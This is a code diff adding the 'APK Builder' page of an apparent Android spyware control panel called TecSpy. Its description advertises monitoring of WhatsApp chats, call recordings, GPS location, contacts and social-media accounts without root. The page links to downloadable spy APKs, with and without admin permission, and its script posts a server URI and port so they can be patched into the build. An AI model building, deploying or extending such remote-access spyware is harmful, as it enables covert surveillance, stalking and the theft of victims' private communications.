@@ -1,0 +1,123 @@
+
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<html>
+	<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="TecSpy is an Android Spy RAT app which can monitor all android devices. Monitor WhatsApp chats, Call recordings, GPS locations, Contacts, Call Logs, File Explorer & more without root. Also Spy Facebook, Instagram, Tinder & Gmail." name=description>
+    <title>TecSpy</title>
+    <link href=/favicon.png rel=icon>
+    <link rel="stylesheet" href="/css/all.css" />
+    <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/semantic.min.css" />
+    <link rel="stylesheet" href="/css/snackbar.min.css" />
+    <link rel="stylesheet" href="/css/custom.css" />
+	<link rel="stylesheet" href="/css/bootstrap.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <script src="/js/bootstrap.bundle.min.js"></script>
+    <script src="/js/jquery-3.4.1.min.js"></script>
+    <script src="/js/semantic.min.js"></script>
+    <script src="/js/snackbar.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+</head>
+
+	<body>
+		<div class="ui container">
+			<br>
+<div class="ui secondary menu">
+    <div class="header item"><a href="/panel"><img src="/logo.png" style="width: 100px"></a></div>
+    
+    <a href="/panel" class="item"> <i class="icon mobile alternate"></i>&nbsp;&nbsp; Devices</a>
+
+    <a href="/builder" class="item"> <i class="icon wrench"></i>&nbsp;&nbsp; APK Builder </a> 
+
+    <a href="/changepass" class="item"> <i class="icon wrench"></i>&nbsp;&nbsp; Change Password </a>
+
+    <a href="/logs" class="item"> <i class="icon terminal"></i>&nbsp;&nbsp; Event Log </a>
+    
+    <div class="right menu">
+        <a href="/logout" class="ui item"> <i class="icon door"></i>&nbsp;&nbsp; Logout </a>
+    </div>
+</div>
+<div class="ui divider"></div>
+<br>
+			<div class="ui segment">
+				<div id="dimmer" class="ui dimmer">
+					<div class="ui indeterminate text loader" id="loadingText">Submitting</div>
+				</div>
+         <p>This is a demo of the main system.  Please use the app on your own device and after using please uninstall the app form your device</p>
+<br><br>
+				<h1 class="ui" style="text-align: center;">APK Builder</h1>
+        
+<div class="col-xl-6 col-lg-8">
+</div>   
+<br>
+				<div class="ui form" id="form">
+					<div class="inline fields">
+            <div class="eight wide field">
+							<a class="positive ui fluid button" download="TecSpy.apk" href="http://tecarticle.com/.app/TecSpy(WithAdmin).apk"
+								><i class="download icon"></i>Download (With Admin Permission)</a>
+						</div><br><br><br>
+                        <div class="eight wide field">
+							<a class="positive ui fluid button" download="TecSpy.apk" href="http://tecarticle.com/.app/TecSpy(WithoutAdmin).apk"
+								><i class="download icon"></i>Download (Without Admin Permission)</a>
+						</div>
+					</div>
+				</div>
+
+
+			</div>
+		</div>
+		<style>
+			.inline.fields {
+				justify-content: center;
+			}
+		</style>
+
+		<script>
+			var loadingTexts = [
+				'Decompiling APK',
+				'Patching Server Information',
+				'Compiling APK',
+				'Signing APK',
+				'Verifying Build',
+				'Finalizing',
+			];
+
+			document.getElementById('uriInput').value = window.location.hostname;
+
+			var loadingIndex = 0;
+			var isDone = false;
+			$('#gobuild').click((e) => {
+				$('#dimmer').addClass('active');
+				build($('#uriInput').val(), '80');
+				setTimeout(loaderText, 500);
+			});
+			function loaderText() {
+				var nextTimeout = Math.floor(Math.random() * 1500) + 700;
+				if (loadingIndex < loadingTexts.length) $('#loadingText').text(loadingTexts[loadingIndex++]);
+				if (loadingIndex !== loadingTexts.length) setTimeout(loaderText, nextTimeout);
+				else if (loadingIndex === loadingTexts.length && !isDone) setTimeout(loaderText, 300);
+				else
+					while (isDone) {
+						isDone = false;
+						$('#dimmer').fadeOut(500, () => {
+							$('#download').removeClass('active');
+						});
+						$('#form').fadeOut(500, () => {
+							$('#download').fadeIn(200);
+						});
+					}
+			}
+
+			const build = async (URI, PORT) => {
+				let data = await $.post('/builder?uri=' + URI + '&port=' + PORT);
+				if (!data.error) isDone = true;
+				else showNotification('#f03434', data.error);
+			};
+		</script>
+<% include partials/footer.ejs %>
+  </body>
+</html>
